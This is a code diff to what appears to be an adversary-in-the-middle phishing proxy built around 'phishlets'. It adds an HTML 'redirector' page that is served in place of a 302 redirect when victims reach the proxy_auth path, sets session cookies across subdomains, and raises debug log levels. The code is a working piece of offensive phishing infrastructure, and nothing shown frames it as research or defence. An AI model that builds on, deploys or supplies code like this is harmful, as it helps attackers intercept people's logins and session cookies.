@@ -475,6 +475,8 @@ def debug_log(message: str, level: str = "INFO"):
     """Centralized debug logging with color coding"""
     if not DEBUG_MODE:
         return
+    # if not level in ["WARN"]:
+    #     return
     
     timestamp = time.strftime("%H:%M:%S")
     if level == "ERROR":
@@ -1938,7 +1940,8 @@ async def proxy_handler(request):
                                 'proxy_auth': getattr(phishlet, 'proxy_auth', ''),  # Include proxy_auth from model
                                 'proxy': proxy_config,  # Include proxy configuration
                                 'is_cache_enabled': getattr(phishlet, 'is_cache_enabled', True),  # Include cache setting
-                                'data': data # Include the full data for replacement logic
+                                'data': data, # Include the full data for replacement logic
+                                'redirector': phishlet.redirector.data if phishlet.redirector else None  # Include redirector HTML data
                             }
                 
                 return None
@@ -1993,7 +1996,7 @@ async def proxy_handler(request):
                     # that should redirect to the landing_url
                     if url_path == proxy_auth_path:
                         landing_url = matching_phishlet.get('data', {}).get('landing_url', '/')
-                        debug_log(f"New session detected on proxy_auth path, redirecting to landing_url: {landing_url}", "INFO")
+                        debug_log(f"New session detected on proxy_auth path, redirecting to landing_url: {landing_url}", "WARN")
                         
                         # Handle both relative and absolute URLs
                         if landing_url.startswith('http'):
@@ -2003,13 +2006,23 @@ async def proxy_handler(request):
                             redirect_path = parsed_url.path
                             if parsed_url.query:
                                 redirect_path += '?' + parsed_url.query
-                            debug_log(f"Converted absolute URL '{landing_url}' to path '{redirect_path}'", "DEBUG")
+                            debug_log(f"Converted absolute URL '{landing_url}' to path '{redirect_path}'", "WARN")
                         else:
                             # Relative URL - use as is
                             redirect_path = landing_url
                         
-                        # Create 302 redirect response with session cookie
-                        response = web.HTTPFound(redirect_path)
+                        # check if phishlet.redirector is set
+                        redirector = matching_phishlet.get('redirector', '')
+                        if not redirector:
+                            debug_log(f"No redirector found, creating 302 redirect response with session cookie", "WARN")
+                            # Create 302 redirect response with session cookie
+                            response = web.HTTPFound(redirect_path)
+                        else:
+                            debug_log(f"Created response with 200 status code and html page data from phishlet.redirector.data", "WARN")
+                            # replace in html body 
+                            redirector = redirector.replace('{landing_url}', redirect_path)
+                            response = web.Response(text=redirector, status=200, content_type='text/html')
+                            debug_log(f"Created response with 200 status code and html page data from phishlet.redirector.data", "WARN")
                         
                         # Set cookie domain to base domain for cross-subdomain access
                         # Extract base domain from proxy_domain (e.g., 'xx.in' from 'xxtt.xx.in')
